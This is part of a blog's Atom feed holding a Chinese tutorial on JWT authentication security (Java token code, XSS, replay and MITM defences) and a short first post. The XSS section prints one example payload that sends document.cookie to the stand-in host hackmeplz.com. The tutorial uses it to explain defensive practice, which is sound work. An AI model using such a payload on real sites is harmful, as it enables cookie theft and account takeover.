class="keyword">byte</span>[] apiKeySecretBytes = DatatypeConverter.parseBase64Binary(apiKey.getSecret());</span><br><span class="line">&gt; Key signingKey = <span class="keyword">new</span> SecretKeySpec(apiKeySecretBytes, signatureAlgorithm.getJcaName());</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="comment">//Let's set the JWT Claims</span></span><br><span class="line">&gt; JwtBuilder builder = Jwts.builder().setId(id)</span><br><span class="line">&gt;                                  .setIssuedAt(now)</span><br><span class="line">&gt;                                  .setSubject(subject)</span><br><span class="line">&gt;                                  .setIssuer(issuer)</span><br><span class="line">&gt;                                  .signWith(signatureAlgorithm, signingKey);</span><br><span class="line">&gt;                                  </span><br><span class="line">&gt; <span class="comment">//if it has been specified, let's add the expiration</span></span><br><span class="line">&gt; <span class="keyword">if</span> (ttlMillis &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">&gt; <span class="keyword">long</span> expMillis = nowMillis + ttlMillis;</span><br><span class="line">&gt; Date exp = <span class="keyword">new</span> Date(expMillis);</span><br><span class="line">&gt; builder.setExpiration(exp);</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="comment">//Builds the JWT and serializes it to a compact, URL-safe string</span></span><br><span class="line">&gt; <span class="keyword">return</span> builder.compact();</span><br><span class="line">&gt; &#125;</span><br></pre></td></tr></table></figure></blockquote><p><strong>解码和验证Token码</strong></p><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">import</span> javax.xml.bind.DatatypeConverter;</span><br><span class="line">&gt; <span class="keyword">import</span> io.jsonwebtoken.Jwts;</span><br><span class="line">&gt; <span class="keyword">import</span> io.jsonwebtoken.Claims;</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="comment">//Sample method to validate and read the JWT</span></span><br><span class="line">&gt; <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">parseJWT</span><span class="params">(String jwt)</span> </span>&#123;</span><br><span class="line">&gt; <span class="comment">//This line will throw an exception if it is not a signed JWS (as expected)</span></span><br><span class="line">&gt; Claims claims = Jwts.parser()</span><br><span class="line">&gt; .setSigningKey(DatatypeConverter.parseBase64Binary(apiKey.getSecret()))</span><br><span class="line">&gt; .parseClaimsJws(jwt).getBody();</span><br><span class="line">&gt; System.out.println(<span class="string">"ID: "</span> + claims.getId());</span><br><span class="line">&gt; System.out.println(<span class="string">"Subject: "</span> + claims.getSubject());</span><br><span class="line">&gt; System.out.println(<span class="string">"Issuer: "</span> + claims.getIssuer());</span><br><span class="line">&gt; System.out.println(<span class="string">"Expiration: "</span> + claims.getExpiration());</span><br><span class="line">&gt; &#125;</span><br></pre></td></tr></table></figure></blockquote><h1 id="基于JWT的Token认证安全问题"><a href="#基于JWT的Token认证安全问题" class="headerlink" title="基于JWT的Token认证安全问题"></a>基于JWT的Token认证安全问题</h1><p>确保验证过程的安全性</p><p>如何保证用户名/密码验证过程的安全性；因为在验证过程中，需要用户输入用户名和密码，在这一过程中，用户名、密码等敏感信息需要在网络中传输。因此，在这个过程中建议采用HTTPS，通过SSL加密传输，以确保通道的安全性。</p><p><strong>如何防范XSS Attacks</strong></p><p>浏览器可以做很多事情，这也给浏览器端的安全带来很多隐患，最常见的如：XSS攻击：跨站脚本攻击(Cross Site Scripting)；如果有个页面的输入框中允许输入任何信息，且没有做防范措施，如果我们输入下面这段代码：</p><blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> /&gt;</span>; a.src='https://hackmeplz.com/yourCookies.png/?cookies=+document.cookie;return a&#125;())"</span><br></pre></td></tr></table></figure></blockquote><p>这段代码会盗取你域中的所有cookie信息，并发送到 hackmeplz.com；那么我们如何来防范这种攻击呢？</p><ul><li><p><strong>XSS攻击代码过滤</strong><br>移除任何会导致浏览器做非预期执行的代码，这个可以采用一些库来实现（如：js下的js-xss，JAVA下的XSS HTMLFilter，PHP下的TWIG）；如果你是将用户提交的字符串存储到数据库的话（也针对SQL注入攻击），你需要在前端和服务端分别做过滤；</p></li><li><p><strong>采用HTTP-Only Cookies</strong><br>通过设置Cookie的参数： HttpOnly; Secure 来防止通过JavaScript 来访问Cookie；<br>如何在Java中设置cookie是HttpOnly呢？<br>Servlet 2.5 API 不支持 cookie设置HttpOnly<br><a href="http://docs.oracle.com/cd/E17802_01/products/products/servlet/2.5/docs/servlet-2_5-mr2/" target="_blank" rel="noopener">http://docs.oracle.com/cd/E17802_01/products/products/servlet/2.5/docs/servlet-2_5-mr2/</a><br>建议升级Tomcat7.0，它已经实现了Servlet3.0<br><a href="http://tomcat.apache.org/tomcat-7.0-doc/servletapi/javax/servlet/http/Cookie.html" target="_blank" rel="noopener">http://tomcat.apache.org/tomcat-7.0-doc/servletapi/javax/servlet/http/Cookie.html</a><br>或者通过这样来设置：</p></li></ul><blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="comment">//设置cookie</span></span><br><span class="line">&gt; response.addHeader(<span class="string">"Set-Cookie"</span>, <span class="string">"uid=112; Path=/; HttpOnly"</span>);</span><br><span class="line">&gt; <span class="comment">//设置多个cookie</span></span><br><span class="line">&gt; response.addHeader(<span class="string">"Set-Cookie"</span>, <span class="string">"uid=112; Path=/; HttpOnly"</span>);</span><br><span class="line">&gt; response.addHeader(<span class="string">"Set-Cookie"</span>, <span class="string">"timeout=30; Path=/test; HttpOnly"</span>);</span><br><span class="line">&gt; <span class="comment">//设置https的cookie</span></span><br><span class="line">&gt; response.addHeader(<span class="string">"Set-Cookie"</span>, <span class="string">"uid=112; Path=/; Secure; HttpOnly"</span>);</span><br></pre></td></tr></table></figure></blockquote><p>在实际使用中，我们可以使FireCookie查看我们设置的Cookie 是否是HttpOnly；</p><p><strong>如何防范Replay Attacks</strong></p><p>所谓重放攻击就是攻击者发送一个目的主机已接收过的包，来达到欺骗系统的目的，主要用于身份认证过程。比如在浏览器端通过用户名/密码验证获得签名的Token被木马窃取。即使用户登出了系统，黑客还是可以利用窃取的Token模拟正常请求，而服务器端对此完全不知道，以为JWT机制是无状态的。<br>针对这种情况，有几种常用做法可以用作参考：<br>1、时间戳 +共享秘钥<br>这种方案，客户端和服务端都需要知道：</p><ul><li>User ID</li><li>共享秘钥</li></ul><p><strong>客户端</strong></p><blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; auth_header = JWT.encode(&#123;</span><br><span class="line">&gt;user_id: <span class="number">123</span>,</span><br><span class="line">&gt;iat: Time.now.to_i,      # 指定token发布时间</span><br><span class="line">&gt;exp: Time.now.to_i + 2   # 指定token过期时间为2秒后，2秒时间足够一次HTTP请求，同时在一定程度确保上一次token过期，减少replay attack的概率；</span><br><span class="line">&gt;&#125;, <span class="string">"&lt;my shared secret&gt;"</span>)</span><br><span class="line">&gt;RestClient.get(<span class="string">"http://api.example.com/"</span>, <span class="attr">authorization</span>: auth_header)</span><br></pre></td></tr></table></figure></blockquote><p><strong>服务端</strong></p><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&gt; class ApiController &lt; ActionController::Base</span><br><span class="line">&gt; attr_reader :current_user</span><br><span class="line">&gt; before_action :set_current_user_from_jwt_token</span><br><span class="line">&gt; def set_current_user_from_jwt_token</span><br><span class="line">&gt; #Step 1:解码JWT，并获取User ID，这个时候不对Token签名进行检查</span><br><span class="line">&gt; #the signature. Note JWT tokens are *not* encrypted, but signed.</span><br><span class="line">&gt; payload = JWT.decode(request.authorization, nil, <span class="keyword">false</span>)</span><br><span class="line">&gt; #Step 2: 检查该用户是否存在于数据库</span><br><span class="line">&gt; <span class="meta">@current</span>_user = User.find(payload[<span class="string">'user_id'</span>])</span><br><span class="line">&gt; #Step 3: 检查Token签名是否正确.</span><br><span class="line">&gt; JWT.decode(request.authorization, current_user.api_secret)</span><br><span class="line">&gt; #Step 4: 检查 "iat" 和"exp" 以确保这个Token是在2秒内创建的.</span><br><span class="line">&gt; now = Time.now.to_i</span><br><span class="line">&gt; <span class="keyword">if</span> payload[<span class="string">'iat'</span>] &gt; now || payload[<span class="string">'exp'</span>] &lt; now</span><br><span class="line">&gt; #如果过期则返回401</span><br><span class="line">&gt; end</span><br><span class="line">&gt; rescue JWT::DecodeError</span><br><span class="line">&gt; #返回 401</span><br><span class="line">&gt; end</span><br><span class="line">&gt; end</span><br></pre></td></tr></table></figure></blockquote><p>2、时间戳 +共享秘钥+黑名单 （类似Zendesk的做法）</p><p><strong>客户端</strong></p><blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; auth_header = JWT.encode(&#123;</span><br><span class="line">&gt;   user_id: <span class="number">123</span>,</span><br><span class="line">&gt;   jti: rand(2 &lt;&lt; 64).to_s,  # 通过jti确保一个token只使用一次，防止replace attack</span><br><span class="line">&gt;   iat: Time.now.to_i,       # 指定token发布时间.</span><br><span class="line">&gt;   exp: Time.now.to_i + 2    # 指定token过期时间为2秒后</span><br><span class="line">&gt; &#125;, <span class="string">"&lt;my shared secret&gt;"</span>)</span><br><span class="line">&gt; RestClient.get(<span class="string">"http://api.example.com/"</span>, <span class="attr">authorization</span>: auth_header)</span><br></pre></td></tr></table></figure></blockquote><p><strong>服务端</strong></p><blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&gt; def set_current_user_from_jwt_token</span><br><span class="line">&gt;   #前面的步骤参考上面</span><br><span class="line">&gt;   payload = JWT.decode(request.authorization, nil, <span class="literal">false</span>)</span><br><span class="line">&gt;   @current_user = User.find(payload[<span class="string">'user_id'</span>])</span><br><span class="line">&gt;   JWT.decode(request.authorization, current_user.api_secret)</span><br><span class="line">&gt;   now = Time.now.to_i</span><br><span class="line">&gt;   <span class="keyword">if</span> payload[<span class="string">'iat'</span>] &gt; now || payload[<span class="string">'exp'</span>] &lt; now</span><br><span class="line">&gt;     #返回401</span><br><span class="line">&gt;   end</span><br><span class="line">&gt;   </span><br><span class="line">&gt;   #下面将检查确保这个JWT之前没有被使用过</span><br><span class="line">&gt;   #使用Redis的原子操作</span><br><span class="line">&gt;   </span><br><span class="line">&gt;   #The redis 的键: &lt;user id&gt;:&lt;one-time use token&gt;</span><br><span class="line">&gt;   key = <span class="string">"#&#123;payload['user_id']&#125;:#&#123;payload['jti']&#125;"</span></span><br><span class="line">&gt;   </span><br><span class="line">&gt;   # 看键值是否在redis中已经存在. 如果不存在则返回nil. 如果存在则返回“1”. .</span><br><span class="line">&gt;   <span class="keyword">if</span> redis.getset(key, <span class="string">"1"</span>)</span><br><span class="line">&gt;     # 返回401</span><br><span class="line">&gt;     # </span><br><span class="line">&gt;   end</span><br><span class="line">&gt;   </span><br><span class="line">&gt;   # 进行键值过期检查</span><br><span class="line">&gt;   redis.expireat(key, payload[<span class="string">'exp'</span>] + <span class="number">2</span>)</span><br><span class="line">&gt; end</span><br></pre></td></tr></table></figure></blockquote><p><strong>如何防范MITM （Man-In-The-Middle）Attacks</strong></p><p>所谓MITM攻击，就是在客户端和服务器端的交互过程被监听，比如像可以上网的咖啡馆的WIFI被监听或者被黑的代理服务器等；<br>针对这类攻击的办法使用HTTPS，包括针对分布式应用，在服务间传输像cookie这类敏感信息时也采用HTTPS；所以云计算在本质上是不安全的。</p><p>参考目录：<br><a href="https://stormpath.com/blog/build-secure-user-interfaces-using-jwts" target="_blank" rel="noopener">https://stormpath.com/blog/build-secure-user-interfaces-using-jwts</a><br><a href="https://auth0.com/blog/2014/01/27/ten-things-you-should-know-about-tokens-and-cookies/" target="_blank" rel="noopener">https://auth0.com/blog/2014/01/27/ten-things-you-should-know-about-tokens-and-cookies/</a><br><a href="https://www.quora.com/Is-JWT-JSON-Web-Token-insecure-by-design" target="_blank" rel="noopener">https://www.quora.com/Is-JWT-JSON-Web-Token-insecure-by-design</a><br><a href="https://github.com/auth0/node-jsonwebtoken/issues/36" target="_blank" rel="noopener">https://github.com/auth0/node-jsonwebtoken/issues/36</a><br><a href="http://christhorntonsf.com/secure-your-apis-with-jwt/" target="_blank" rel="noopener">http://christhorntonsf.com/secure-your-apis-with-jwt/</a><br><a href="https://mega.nz/#!YXJRzBzC" target="_blank" rel="noopener">lufei</a><br><br><br><br></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt; 本文介绍HTTP Basic Auth、OAuth、Cookie Auth和Token这几种常见的WEB后台认证机制
    
    </summary>
    
    
      <category term="node.js" scheme="https://baronfu.github.io/tags/node-js/"/>
    
  </entry>
  
  <entry>
    <title>我的第一篇博客</title>
    <link href="https://baronfu.github.io/2018/05/28/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
    <id>https://baronfu.github.io/2018/05/28/我的第一篇博客/</id>
    <published>2018-05-28T02:21:38.000Z</published>
    <updated>2018-06-06T15:22:57.038Z</updated>
    
    <content type="html"><![CDATA[<h1 id="为什么要写博客"><a href="#为什么要写博客" class="headerlink" title="为什么要写博客"></a>为什么要写博客</h1><p>2017年是一个不平凡的时间段，大学的生活接近尾声，即将脱离大学生活的圈子，参加正式的社会工作，进入软件开发行业工作。在实习期间仔细品读了一些大牛的博客后发现，每个人写的博客目的和内容都尽不相同。我开始动笔主要写博客源于：</p><ul><li><strong>积累</strong>  开始积累即将在工作学习过程中踩的坑</li><li><strong>分享</strong>  分享自己在工作中学习的新技术知识</li><li><strong>激励</strong>  激励自己不断的阅读、学习、实践和创新</li><li><strong>交流</strong>  博客圈是一个充满大神的圈子</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;为什么要写博客&quot;&gt;&lt;a href=&quot;#为什么要写博客&quot; class=&quot;headerlink&quot; title=&quot;为什么要写博客&quot;&gt;&lt;/a&gt;为什么要写博客&lt;/h1&gt;&lt;p&gt;2017年是一个不平凡的时间段，大学的生活接近尾声，即将脱离大学生活的圈子，参加正式的社会工作，进入
      
    
    </summary>
    
    
      <category term="随笔" scheme="https://baronfu.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
</feed>
